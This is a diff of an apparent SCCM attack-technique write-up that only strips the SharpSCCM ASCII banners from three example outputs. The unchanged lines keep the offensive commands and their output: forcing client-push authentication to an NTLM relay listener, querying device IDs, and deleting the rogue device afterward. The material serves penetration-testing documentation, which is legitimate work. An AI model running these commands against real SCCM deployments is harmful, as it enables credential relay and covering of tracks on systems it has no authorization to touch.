@@ -71,10 +71,6 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 ```
 SharpSCCM.exe invoke client-push -sms <MANAGEMENT_POINT> -sc <SITECODE> -t <NTLMRELAYX_LISTENER_IP>
 
-  _______ _     _ _______  ______  _____  _______ _______ _______ _______
-  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
-  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem
-
 [+] Created "ConfigMgr Client Messaging" certificate in memory for device registration and signing/encrypting subsequent messages
 [+] Reusable Base64-encoded certificate:
 
@@ -116,10 +112,6 @@ The following command can be used to identify the device's ResourceId:
 ```
 SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"
 
-  _______ _     _ _______  ______  _____  _______ _______ _______ _______
-  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
-  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem
-
 [+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
 [+] Executing WQL query: SELECT ResourceId,Name,SMSUniqueIdentifier FROM SMS_R_System WHERE Name LIKE '%<NTLMRELAYX_LISTENER_IP>%'
 -----------------------------------
@@ -139,10 +131,6 @@ The following command can be used to remove a device with a specified GUID:
 
 ```
 SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>
-
-  _______ _     _ _______  ______  _____  _______ _______ _______ _______
-  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
-  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem
 
 [+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
 [+] Deleted device with SMSUniqueIdentifier GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C
